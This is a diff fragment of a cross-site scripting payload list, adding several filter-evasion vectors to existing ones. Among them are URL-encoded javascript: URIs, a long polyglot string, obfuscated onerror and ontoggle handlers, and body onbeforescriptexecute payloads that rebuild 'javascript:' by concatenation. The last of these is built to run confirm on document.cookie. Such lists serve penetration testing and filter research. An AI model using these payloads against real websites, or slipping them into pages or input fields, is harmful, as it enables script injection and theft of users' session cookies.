@@ -16,5 +16,12 @@ javascript%3A%2561lert%281%29 javascript%3A%7B+alert%600%60+%7D
 <%2Fstyle><%2Fscript><​script>alert%28"XSS"%29<%2Fscript>
 %5Cx6A%5Cx61%5Cx76%5Cx61%5Cx73%5Cx63%5Cx72%5Cx69%5Cx70%5Cx74%5Cx3aalert%281%29
 <img/src/onerror​=arguments[0].path.pop().['al'+'ert'](1)>
- JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
+JavaScript​://%250Aalert?.(1)// '/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--> </Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript> \74k<K/contentEditable/autoFocus/OnFocus​= /*${/*/;{/**/(alert)(1)}//><Base/Href=//hello\76-->
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
+"><img src=x onanything="">
+"><body onload> =
+"><body onbeforescriptexecute=x>
+"><body onbeforescriptexecute=x(>
+"><body onbeforescriptexecute="b='a'; location='jav'+b+'script: ">
+"><BODY onbeforescriptexecute="c=')'; b='a'; location='jav'+b+'script:x( "+c">
+"><BODYonbeforescriptexecute="x1-'cookie'; c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+x1+c">
